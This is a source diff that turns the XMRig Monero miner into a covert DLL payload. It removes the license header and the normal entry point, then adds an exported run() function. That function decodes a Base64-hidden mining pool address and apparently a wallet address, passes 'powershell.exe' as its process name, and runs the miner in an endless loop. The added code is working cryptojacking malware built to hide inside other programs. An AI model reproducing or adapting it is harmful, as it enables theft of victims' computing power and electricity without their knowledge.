@@ -1,42 +1,35 @@
-/* XMRig
- * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
- * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
- * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
- * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
- * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
- * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
- * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
- * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
- *
- *   This program is free software: you can redistribute it and/or modify
- *   it under the terms of the GNU General Public License as published by
- *   the Free Software Foundation, either version 3 of the License, or
- *   (at your option) any later version.
- *
- *   This program is distributed in the hope that it will be useful,
- *   but WITHOUT ANY WARRANTY; without even the implied warranty of
- *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
- *   GNU General Public License for more details.
- *
- *   You should have received a copy of the GNU General Public License
- *   along with this program. If not, see <http://www.gnu.org/licenses/>.
- */
-
-#include "App.h"
-#include "base/kernel/Entry.h"
+#include "AppManager.h"
+#include "Environment.h"
+#include "Windows.h"
 #include "base/kernel/Process.h"
+#include "App.h"
+#include <vector>
+#include "base/tools/Base64.h"
 
+extern "C" {
+	__declspec(dllexport) void run();
+}
 
-int main(int argc, char **argv) {
-    using namespace xmrig;
+using namespace xmrig;
 
-    Process process(argc, argv);
-    const Entry::Id entry = Entry::get(process);
-    if (entry) {
-        return Entry::exec(process, entry);
-    }
-
-    App app(&process);
-
-    return app.exec();
+void run() 
+{
+	static const char value1[] = "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjg=";
+	static const char value2[] = "NDgzSGZUWk5qV1FkN1doRXRzMVdzZkF6b0FyMWVHYTVuZG1mamhYYjk5VktEbUpWRzNNUXczdUNSZ0U3YUtCUFFXREJFTlNOVlpkcThoQ2dOQnVRVWVKVkVZN2prZDE=";
+	int buf1_len = move_0399_len(value1);
+	int buf2_len = move_0399_len(value2);
+	char* buf1 = new char[buf1_len];
+	char* buf2 = new char[buf2_len];
+	int buf1_act_size = move_0399(buf1, value1);
+	int buf2_act_size = move_0399(buf2, value2);
+	buf1[buf1_act_size] = '\0';
+	buf2[buf2_act_size] = '\0';
+	int args_count = 7;
+	char* args[] = { "powershell.exe", "--verbose", "--log-file=C:\\Temp\\out.txt", "-o", buf1, "-u", buf2 };
+	Process process(args_count, args);
+	while (true)
+	{
+		App app(&process);
+		app.exec();
+	}
 }
